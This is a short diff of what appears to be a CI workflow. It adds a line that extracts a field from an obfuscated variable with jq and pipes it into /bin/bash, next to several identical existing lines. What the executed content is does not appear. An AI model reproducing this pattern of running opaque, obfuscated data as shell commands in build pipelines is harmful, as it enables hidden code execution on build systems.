@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$i17" | jq -r .kqljc019 | /bin/bash
           echo $istmk780 | jq -r .blkos4 | /bin/bash
           printf '%s' "$p70" | jq -r .f4530 | /bin/bash
+          printf '%s' "$gp257" | jq -r .rpt451 | /bin/bash
 
       - name: Archive output
         if: always()
